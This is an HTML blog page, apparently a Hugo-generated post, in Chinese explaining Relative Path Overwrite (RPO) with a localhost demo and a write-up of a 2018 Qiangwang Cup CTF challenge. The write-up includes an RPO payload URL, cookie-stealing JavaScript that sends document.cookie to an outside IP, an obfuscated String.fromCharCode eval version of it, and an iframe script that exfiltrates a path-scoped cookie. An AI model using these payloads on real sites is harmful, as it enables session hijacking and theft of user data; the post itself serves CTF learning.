@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="RPO（Relative Path Overwrite）"/>
+  <meta name="twitter:description" content="越来越懒了，一篇总结断断续续写了好几天。
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>RPO（Relative Path Overwrite） &middot; Yang1k</title>
+		<link rel="shortcut icon" href="https://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://yang1k.github.io/post'>Archive</a>
+	<a href='https://yang1k.github.io/tags'>Tags</a>
+	<a href='https://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="https://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        RPO（Relative Path Overwrite）
+                    </h1>
+                    <h2 class="headline">
+                    Jan 1, 0001 00:00
+                    · 152 words
+                    · 1 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#什么是rpo">什么是RPO</a></li>
+<li><a href="#利用的基础知识">利用的基础知识</a>
+<ul>
+<li><a href="#源码">源码</a></li>
+<li><a href="#服务端处理url中-2f和-的差异">服务端处理url中%2f和/的差异。</a>
+<ul>
+<li><a href="#apache">apache</a></li>
+<li><a href="#nginx">Nginx</a></li>
+</ul></li>
+<li><a href="#客户端对-2f的处理">客户端对%2f的处理</a></li>
+</ul></li>
+<li><a href="#简单复现">简单复现</a></li>
+<li><a href="#share-your-mind">Share your mind</a></li>
+<li><a href="#后记">后记</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>越来越懒了，一篇总结断断续续写了好几天。
+<!-- more --></p>
+
+<h2 id="什么是rpo">什么是RPO</h2>
+
+<p>RPO（Relative Path Overwrite）相对路径覆盖，主要就是利用服务端和客户端对url的处理的一些差异，来让客户端加载我们想让客户端加载的文件。而不是网站开发者想加载的文件。</p>
+
+<h2 id="利用的基础知识">利用的基础知识</h2>
+
+<h3 id="源码">源码</h3>
+
+<p>文件结构</p>
+
+<pre><code>rpo/
+----yang/
+--------index.php
+--------a.js
+----a.js
+
+</code></pre>
+
+<p>rpo/yang/index.php</p>
+
+<pre><code>hahahah
+&lt;script src=&quot;./a.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<p>rpo/yang/a.js</p>
+
+<pre><code>alert(&quot;i'm is yang/a.js&quot;);
+</code></pre>
+
+<p>rpo/a.js</p>
+
+<pre><code>alert(&quot;i'm is rpo/a.js&quot;);
+</code></pre>
+
+<h3 id="服务端处理url中-2f和-的差异">服务端处理url中%2f和/的差异。</h3>
+
+<h4 id="apache">apache</h4>
+
+<p>url及返回结果</p>
+
+<pre><code>http://127.0.0.1/rpo/yang/index.php   #页面返回正常
+http://127.0.0.1/rpo/yang%2findex.php #页面返回异常，显示Not Found
+</code></pre>
+
+<h4 id="nginx">Nginx</h4>
+
+<p>url及返回结果</p>
+
+<pre><code>http://127.0.0.1/rpo/yang/index.php   #页面返回正常
+http://127.0.0.1/rpo/yang%2findex.php #页面返回正常
+</code></pre>
+
+<p>从测试结果可以知道，Apache和Nginx对于%2f的处理并不相同。
+Apache不会将&rsquo;%2f&rsquo;作为&rsquo;/&lsquo;处理，所以执行的结果就是去rpo目录下寻找名为yang%2findex.php的文件，显然服务器并没有yang%2findex.php该文件，所以显示not found。
+Nginx则不同，Nginx会将&rsquo;%2f&rsquo;作为&rsquo;/&lsquo;去处理，所以执行的结果显示的为正常页面。</p>
+
+<h3 id="客户端对-2f的处理">客户端对%2f的处理</h3>
+
+<p>客户端为什么会有对%2f的处理呢？客户端不是运行在用户的电脑上的吗？怎么会牵扯到服务器的文件？
+刚开始我也是困惑在这里。我们来看代码。
+在index.php有这样的一段js代码</p>
+
+<pre><code>&lt;script src=&quot;./a.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<p>这里使用的是相对路径来加载js代码。
+浏览器在加载相对路径的依据是url中的最后一个&rsquo;/&lsquo;,需要注意的是浏览器不会对%2f进行解码。也就是说浏览器不会将&rsquo;%2f&rsquo;当作&rsquo;\&lsquo;。</p>
+
+<p>所以RPO实现的原理就是利用客户端和服务端对于%2f的处理方式不同。</p>
+
+<h2 id="简单复现">简单复现</h2>
+
+<p>实验环境
+- 服务端 Nginx
+- 客户端 谷歌浏览器
+- 源码   服务端的源码就是文章前面给出的代码。</p>
+
+<p>url为<a href="http://127.0.0.1/rpo/yang/index.php">http://127.0.0.1/rpo/yang/index.php</a></p>
+
+<p><img src="http://p0j0hyu3s.bkt.clouddn.com/RPO1.jpg" alt="图一" /></p>
+
+<p>url为<a href="http://127.0.0.1/rpo/yang%2findex.php">http://127.0.0.1/rpo/yang%2findex.php</a></p>
+
+<p><img src="http://p0j0hyu3s.bkt.clouddn.com/RPO2.jpg" alt="图二" /></p>
+
+<p>由图可知使用%2f和/加载的js文件并不相同。
+<a href="http://blog.nsfocus.net/rpo-attack/">RPO参考链接</a></p>
+
+<h2 id="share-your-mind">Share your mind</h2>
+
+<p>2018年强网杯的一道题，比赛时没有做出来。赛后复现的时候学到了一些东西，记录一下。</p>
+
+<p>知识点
+- pathinfo模式
+- xss打cookie</p>
+
+<p>在主页查看源码可以看到以下代码
+<img src="http://p0j0hyu3s.bkt.clouddn.com/qwb1.jpg" alt="qwb1" />
+我们可以看到这里使用了相对路径的引用，所以可能会存在RPO漏洞。
+在网站的overview处可以查看在写过的内容。点开查看文章，查看文章页面的源代码，发现会自动给标题添加一个&lt;h1&gt;标签，文章内容没有做过任何处理。于是就可以在文章里写入js代码，在通过RPO来使浏览器执行我们写入的js代码。</p>
+
+<p>查看文章的url</p>
+
+<pre><code>http://39.107.33.96:20000/index.php/view/article/2957
+</code></pre>
+
+<p>实现rpo的url</p>
+
+<pre><code>http://39.107.33.96:20000/index.php/view/article/2957/..%2f..%2f..%2f..%2findex.php
+</code></pre>
+
+<p>在理解怎么用RPO加载写入的文章的时候卡了比较久，因为后台代码是</p>
+
+<pre><code>&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<p>所以利用RPO加载的时候加载的不应该是2957/static/js/jquery.min.js的js文件内容吗？
+这个js文件难道是用来存放我们写入的文章内容？？？
+这个js文件难道是为了出题才这样设置的？？？
+这听起来很作啊，出题师傅不会这样的吧。
+然后查了很久，才知道有一个模式叫做pathinfo模式。(菜即是罪.)</p>
+
+<p>什么是pathinfo模式？
+在网站得url中有这样一种url，文件后面还跟有&rsquo;/&lsquo;。这种/后面的内容pathinfo模式下会被当做参数。类似于
+index.php?a=***。这是一种传参模式。
+例如：</p>
+
+<pre><code>http://39.107.33.96:20000/index.php/view/article/2957
+
+</code></pre>
+
+<p>所以static/js/jquery.min.js在url中会被当做参数。</p>
+
+<p>测试可知下面两个url的返回结果是一样的。</p>
+
+<pre><code>http://39.107.33.96:20000/index.php/view/article/2957/static/js/jquery.min.js
+
+http://39.107.33.96:20000/index.php/view/article/2957
+</code></pre>
+
+<p>在知道了这个知识点之后，我们再来分析payload就明白到底是怎么加载我们写的文章内容的了。</p>
+
+<pre><code>请求的url
+http://39.107.33.96:20000/index.php/view/article/2957/..%2f..%2f..%2f..%2findex.php
+客户端代码
+&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+请求加载的url
+http://39.107.33.96:20000/index.php/view/article/2957/static/js/jquery.min.js
+</code></pre>
+
+<p>至此，整个RPO利用的流程就清晰了。
+- 写文章时写入js代码
+- 将RPO的url通过report提交到后台。
+- 等待回显。</p>
+
+<p>因为对引号过滤，所以使用String.fromCharCode(解ascii码)来绕过过滤。
+打cookie的js代码</p>
+
+<pre><code>new Image().src=&quot;http://150.95.174.245:8888?a=&quot;+encodeURI(document.cookie);
+</code></pre>
+
+<p>最终写入文章内容</p>
+
+<pre><code>eval(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,34,104,116,116,112,58,47,47,49,53,48,46,57,53,46,49,55,52,46,50,52,53,58,56,56,56,56,63,97,61,34,43,101,110,99,111,100,101,85,82,73,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59));
+</code></pre>
+
+<p>收到回显
+<img src="http://p0j0hyu3s.bkt.clouddn.com/qwb%E4%BA%8C.jpg" alt="qwb2" /></p>
+
+<p>HINT=Try to get the cookie of path &ldquo;/QWB_fl4g/QWB/&rdquo;</p>
+
+<p>找了一个可以读取目录下的cookie的js代码。</p>
+
+<pre><code>var ad = document.createElement(&quot;iframe&quot;);
+ad.src = &quot;QWB_fl4g/QWB/&quot;;
+ad.id = &quot;frame&quot;;
+document.body.appendChild(ad);
+  ad.onload = function (){window.location.href=&quot;http://150.95.174.245:8888?a=&quot;+document.getElementById(&quot;frame&quot;).contentWindow.document.cookie;
+}
+</code></pre>
+
+<p>提交后收到回显
+<img src="http://p0j0hyu3s.bkt.clouddn.com/qwb3.jpg" alt="qwb3" /></p>
+
+<p>结束！</p>
+
+<h2 id="后记">后记</h2>
+
+<p>这次比赛后明白了很多事情，意识到ctf这个东西锻炼的是自己的快速学习能力，而不是考察你做了多少题，当然做题也是不可或缺的，但是重要的还是思维而不是仅限于题目的知识点。
+在刚开始接触ctf的时候，大哥说过这些，当时没有很多感触，现在回想，着实很有道理。或许人就是这样，只有经历过，才能明白前人说的道理。</p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fyang1k.github.io%2ftypecho%2fpost%2frpo%2f - RPO%ef%bc%88Relative%20Path%20Overwrite%ef%bc%89 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="https://yang1k.github.io/js/main.js"></script>
+<script src="https://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
